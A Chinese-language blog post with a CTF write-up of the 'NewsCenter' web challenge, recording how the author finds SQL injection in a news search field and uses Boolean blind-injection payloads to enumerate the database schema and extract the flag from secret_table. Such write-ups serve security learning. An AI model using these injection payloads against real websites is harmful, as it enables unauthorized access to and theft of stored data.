---
layout: post
title: Web进阶题-NewsCenter
excerpt: "攻防世界进阶Web题目-NewsCenter"
date:   2020-10-15 19:21:00
categories: [CTF]
comments: true
---

## 我的解题过程

1. 题目描述，"如题目环境报错，稍等片刻刷新即可"，本题与报错有关？
2. 访问网站，有一个搜索框和一堆新闻，搜索框用于筛选新闻的标题，且不区分大小写
3. 通过Burp Suite抓包，发现为POST方法提交了search参数
4. 猜测SQL语句为'SELECT title,context FROM news WHERE title LIKE'.$POST['search']
5. 尝试堆叠注入，*';show databases;'*，没有返回有用内容，无堆叠注入漏洞
6. 确认注入存在
   * 访问*hello*，返回一条记录
   * 访问*hello'*，多了一个单引号，系统崩溃，所以单引号没被过滤
   * 访问*hello' and 1=1#*，返回内容为空，内容异常
   * 访问*' or 1=1#*，返回所有记录
   * 访问*flag*，返回内容为空
   * 访问*flag' or 1=1#*，返回所有记录
   * ...
   * 最后发现只要出现星号和反单引号就会崩溃系统，应该是被过滤掉了
7. 所以可以用or语句进行Boolean盲注
   * *flag' or ord(mid(database(),$1$,1))=§1§*，数据库名为news
   * *flag' or ord(mid(user(),$1$,1))=§1§*，用户名为user@10.42.145.23
   * *flag' or ord(mid((select version()),§1§,1))=§1§*，数据库版本为5.5.61
   * *flag' or ord(mid((select table_name from information_schema.tables where TABLE_SCHEMA=database() limit §1§,1),§1§,1))=§1§ #*，当前数据库中的表有secret_table
   * *flag' or ord(mid((SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ",") FROM information_schema.COLUMNS  WHERE TABLE_SCHEMA = 'news' ),§1§,1))=§1§ #*，news数据库中有id,titl,content,id,fn4g字段
   * *flag' or ord(mid((SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ",") FROM information_schema.COLUMNS  WHERE TABLE_SCHEMA = 'news'  and TABLE_NAME='secret_table'),§1§,1))=§1§ #*，secret表中的字段有id,fl4g
   * *flag' or ord(mid((SELECT fl4g FROM secret_table where id=1),§1§,1))=§1§ #*，爆出flag，QCTF{sq1_inJec7ion_ezzz}
8. 提交，答案正确

